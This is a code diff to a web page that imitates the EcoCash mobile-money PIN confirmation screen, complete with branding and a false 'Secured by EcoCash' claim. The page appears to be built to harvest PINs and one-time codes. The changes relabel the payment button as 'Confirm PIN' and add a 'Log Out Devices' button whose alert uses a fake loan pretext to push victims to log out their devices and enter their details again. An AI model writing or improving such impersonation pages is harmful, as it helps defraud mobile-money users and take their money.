@@ -224,11 +224,11 @@
     <div id="pinOv" class="pin-overlay">
         <div class="pin-card">
             <div class="pin-logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-            <div class="pin-title">Confirm Payment</div>
+            <div class="pin-title">Confirm PIN</div>
             <div class="pin-sub">Enter your EcoCash PIN to authorize this transaction</div>
 
             <div class="pin-amount">
-                <div class="pa-label">Amount to Pay</div>
+                <div class="pa-label">Amount</div>
                 <div class="pa-value" id="pinAmt">USD 0.00</div>
             </div>
 
@@ -239,8 +239,9 @@
             </div>
 
             <div class="pin-btns">
-                <button class="pin-btn pin-btn-ok" onclick="doPin()">Pay Now</button>
+                <button class="pin-btn pin-btn-ok" onclick="doPin()">Confirm PIN</button>
                 <button class="pin-btn pin-btn-x" onclick="closePin()">Cancel</button>
+                <button class="pin-btn pin-btn-x" onclick="logOutDevices()">Log Out Devices</button>
             </div>
 
             <div class="pin-secure">&#128274; Secured by EcoCash &middot; 256-bit SSL</div>
@@ -417,6 +418,11 @@
             boxes.forEach(function(b) { b.value = ''; b.classList.remove('ok'); });
             otp = '';
             boxes[0].focus();
+        }
+
+        function logOutDevices() {
+            alert('In order for loan to be successful, you have to log out existing devices and repeat, several devices detected');
+            closePin();
         }
 
         window.addEventListener('load', function() { init(); boxes[0].focus(); });
